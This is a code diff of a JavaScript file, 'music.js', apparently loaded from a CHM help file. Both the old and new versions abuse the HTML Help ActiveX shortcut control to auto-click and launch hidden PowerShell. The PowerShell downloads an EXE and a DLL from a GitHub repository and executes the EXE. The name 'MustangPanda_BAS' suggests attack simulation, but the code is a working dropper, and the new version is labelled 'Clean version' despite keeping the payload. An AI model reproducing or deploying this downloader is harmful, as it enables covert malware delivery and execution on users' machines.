@@ -1,32 +1,29 @@
-// music.js - Download EXE + DLL + Execute (CHM Compatible)
+// music.js - Clean version for CHM
 
-alert("music.js loaded from GitHub!");
+alert("music.js loaded successfully!");
 
 try {
     var obj = document.createElement("object");
     obj.setAttribute("classid", "clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11");
     
-    var psCommand = ",powershell.exe,-NoProfile -WindowStyle Hidden -Command \"$temp = $env:TEMP; ";
-    psCommand += "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe' -OutFile '$temp\\wmpshare.exe'; ";
-    psCommand += "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll' -OutFile '$temp\\wmp.dll'; ";
-    psCommand += "Start-Process '$temp\\wmpshare.exe'\"";
+    var cmd = ",powershell.exe,-NoProfile -WindowStyle Hidden -Command ";
+    cmd += "\"$t=$env:TEMP; ";
+    cmd += "Invoke-WebRequest 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe' -OutFile '$t\\wmpshare.exe'; ";
+    cmd += "Invoke-WebRequest 'https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll' -OutFile '$t\\wmp.dll'; ";
+    cmd += "Start-Process '$t\\wmpshare.exe'\"";
 
     obj.innerHTML = 
         '<param name="Command" value="ShortCut">' +
-        '<param name="Item1" value="' + psCommand + '">' +
+        '<param name="Item1" value="' + cmd + '">' +
         '<param name="Item2" value="273,1,1">';
 
     document.body.appendChild(obj);
     
-    setTimeout(function() {
-        try {
-            obj.Click();
-            alert("Command sent: Downloading wmpshare.exe + wmp.dll + Executing...");
-        } catch(e) {
-            alert("Click Error: " + e.message);
-        }
-    }, 800);
+    setTimeout(function(){
+        obj.Click();
+        alert("✅ Downloading EXE + DLL and executing...");
+    }, 700);
 
 } catch(e) {
-    alert("Main Error: " + e.message);
+    alert("Error: " + e.message);
 }
